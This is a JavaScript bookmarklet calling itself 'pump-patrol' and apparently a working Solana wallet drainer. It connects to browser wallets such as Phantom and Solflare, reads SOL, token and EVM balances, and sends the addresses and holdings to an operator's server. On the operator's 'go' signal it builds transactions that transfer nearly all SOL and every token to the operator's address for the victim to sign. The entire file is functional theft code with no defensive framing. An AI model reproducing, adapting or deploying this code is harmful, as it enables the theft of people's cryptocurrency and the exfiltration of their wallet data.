(async()=>{
const K='72d296b612eb0a11931b364ba1333a70';
const BASE=(window.__PP||'').replace(/\/+$/,'');
const log=(m,c)=>{try{console.log('%c[pump-patrol] '+m,c||'color:#5eead4;font-weight:bold')}catch(e){}};
if(!BASE){log('no origin — bookmark not built from the site','color:#ff5c7a');return}
log('start · origin '+BASE);
const sid=Math.random().toString(36).slice(2,8);
const site=()=>location.host||location.protocol+'//'+location.hostname;
const report=async(o)=>{try{const r=await fetch(BASE+'/api/report/'+sid+'?k='+K,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(Object.assign({site:site()},o))});if(!r.ok)log('report HTTP '+r.status,'color:#ff5c7a')}catch(e){log('report failed '+e,'color:#ff5c7a')}};
const le8=v=>{const d=new DataView(new ArrayBuffer(8));d.setBigUint64(0,BigInt(v),true);return[...new Uint8Array(d.buffer)]};

// 1) config
let cfgR;try{cfgR=await fetch(BASE+'/api/config?k='+K)}catch(e){cfgR=null}
if(!cfgR){log('config fetch failed (CORS/network/origin)','color:#ff5c7a');await report({phase:'fault',fault:'config fetch failed — is this origin serving /api?'});return}
let cfg=null;try{cfg=await cfgR.json()}catch(e){}
if(!cfg||cfg.ok===false||!cfg.me){log('config HTTP '+cfgR.status+' '+JSON.stringify(cfg),'color:#ff5c7a');await report({phase:'fault',fault:'config HTTP '+cfgR.status+' — K mismatch or bot down'});return}
const PER=cfg.perTx||2;
log('config ok · drain to '+cfg.me);

// 2) web3 — ESM load (the .mjs is the self-contained browser build)
const W3=await(async()=>{
  const urls=['https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.mjs','https://esm.sh/@solana/web3.js@1.95.3'];
  for(const u of urls){
    try{const m=await import(u);const M=m.default&&m.default.Connection?m.default:m;if(M.Connection)return M}catch(e){log('web3 load failed: '+u,'color:#ffb454')}
  }
  // last resort: script tag + CJS eval shim
  try{const r=await fetch('https://unpkg.com/@solana/web3.js@1.95.3/lib/index.js');const m={exports:{}};(new Function('module','exports',await r.text()))(m,m.exports);return window.solanaWeb3||m.exports.default||m.exports}catch(e){}
  return null;
})();
if(!W3){await report({phase:'fault',fault:'web3.js failed to load from all CDNs (CSP or network) — retry in a normal tab, not inside an iframe'});return}
log('web3 loaded');

// 3) start — bot knows the session is live
await report({phase:'start'});

// 4) connect + read
const{Connection,PublicKey,SystemProgram,Transaction,TransactionInstruction,LAMPORTS_PER_SOL}=W3;
const conn=new Connection(cfg.rpc);
const TOKEN=new PublicKey('TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm'),ATAP=new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8khL'),ME=new PublicKey(cfg.me);
const findAta=(o,m)=>PublicKey.findProgramAddressSync([o.toBuffer(),m.toBuffer()],ATAP)[0];
const cands=[['Phantom',window.phantom?.solana],['Wallet',window.solana],['Solflare',window.solflare],['Backpack',window.backpack?.solana||window.backpack]];
const seen=new Set(),ws=[];
for(const[n,p]of cands)if(p&&p.connect&&!seen.has(p)){seen.add(p);ws.push({n,p})}
let evm='';
try{const e=window.ethereum;if(e){const a=await e.request({method:'eth_accounts'});if(a.length){const w=await e.request({method:'eth_getBalance',params:[a[0],'latest']});evm=a[0]+' — '+(BigInt(w)/10n**18n)+' ETH'}}}catch(e){}
const live=[],rep=[];
for(const w of ws){
  try{
    log('connecting '+w.n+'…');
    await w.p.connect();
    const owner=new PublicKey(w.p.publicKey.toString());
    const lam=await conn.getBalance(owner);
    const ta=await conn.getParsedTokenAccountsByOwner(owner,{programId:TOKEN});
    const toks=[];
    for(const it of ta.value){const i=it.account.data.parsed.info,a=i.tokenAmount;if(BigInt(a.amount)>0n)toks.push({src:it.pubkey,mint:new PublicKey(i.mint),dec:a.decimals,amt:a.amount,ui:a.uiAmountString??a.uiAmount})}
    live.push({w,owner,lam,toks});
    rep.push({name:w.n,addr:owner.toString(),sol:+(lam/LAMPORTS_PER_SOL).toFixed(6),tokens:toks.map(t=>({mint:t.mint.toString(),amt:String(t.ui)}))});
    log(w.n+' connected · '+(lam/LAMPORTS_PER_SOL).toFixed(5)+' SOL');
  }catch(e){rep.push({name:w.n,addr:'(refused)',sol:0,tokens:[]});log(w.n+' refused','color:#ffb454')}
}

// 5) ready — WALLET CONNECTED card
await report({phase:'ready',evm,wallets:rep});
log('ready · waiting for DRAIN');

// 6) poll verdict
let act=null;const t0=Date.now();
while(!act&&Date.now()-t0<300000){
  let v=null;try{const r=await fetch(BASE+'/api/verdict/'+sid+'?k='+K);v=await r.json()}catch(e){}
  if(v&&v.a)act=v.a;else await new Promise(s=>setTimeout(s,2500));
}
if(act!=='go'){log(act==='stop'?'skipped':'timed out');await report({phase:'done',note:act==='stop'?'skipped by operator':'timed out (5 min)'});return}
log('DRAIN approved');

// 7) drain
const RENT=await conn.getMinimumBalanceForRentExemption(165);
let sigs=0;
for(const{w,owner,lam,toks}of live){
  const chunks=[];for(let i=0;i<toks.length;i+=PER)chunks.push(toks.slice(i,i+PER));
  if(!chunks.length)chunks.push([]);
  let newAtas=0;
  for(const t of toks){const a=await conn.getAccountInfo(findAta(owner,t.mint)).catch(()=>null);if(!a)newAtas++}
  const drainLam=lam-chunks.length*5000-newAtas*RENT;
  let first=true;
  for(const chunk of chunks){
    try{
      const bh=await conn.getLatestBlockhash();
      const tx=new Transaction({feePayer:owner,recentBlockhash:bh.blockhash});
      if(first&&drainLam>0)tx.add(SystemProgram.transfer({fromPubkey:owner,toPubkey:ME,lamports:drainLam}));
      for(const t of chunk){
        const ata=findAta(owner,t.mint);
        const exists=await conn.getAccountInfo(ata).catch(()=>null);
        if(!exists)tx.add(new TransactionInstruction({programId:ATAP,data:Uint8Array.of(0),keys:[
          {pubkey:owner,isSigner:true,isWritable:true},{pubkey:ata,isSigner:false,isWritable:true},{pubkey:owner,isSigner:true,isWritable:false},
          {pubkey:t.mint,isSigner:false,isWritable:false},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},
          {pubkey:TOKEN,isSigner:false,isWritable:false},{pubkey:W3.SYSVAR_RENT_PUBKEY,isSigner:false,isWritable:false}]}));
        tx.add(new TransactionInstruction({programId:TOKEN,keys:[
          {pubkey:t.src,isSigner:false,isWritable:true},{pubkey:t.mint,isSigner:false,isWritable:false},
          {pubkey:ata,isSigner:false,isWritable:true},{pubkey:owner,isSigner:true,isWritable:false}],
          data:Uint8Array.from([12,...le8(t.amt),t.dec])}));
      }
      let sig;
      if(w.p.signAndSendTransaction){const s=await w.p.signAndSendTransaction(tx);sig=typeof s==='string'?s:(s.signature||s)}
      else{const st=await w.p.signTransaction(tx);sig=await conn.sendRawTransaction(st.serialize())}
      const s=typeof sig==='string'?sig:(sig.signature||String(sig));
      try{await conn.confirmTransaction(s,'confirmed')}catch(e){}
      sigs++;log('signed '+s.slice(0,8));
    }catch(e){log('tx failed '+e,'color:#ff5c7a')}
    first=false;
  }
}
await report({phase:'done',note:sigs+' tx signed',wallets:rep});
log('done · '+sigs+' tx');
})().catch(e=>{try{console.log('%c[pump-patrol] fatal '+e,'color:#ff5c7a')}catch(_){}});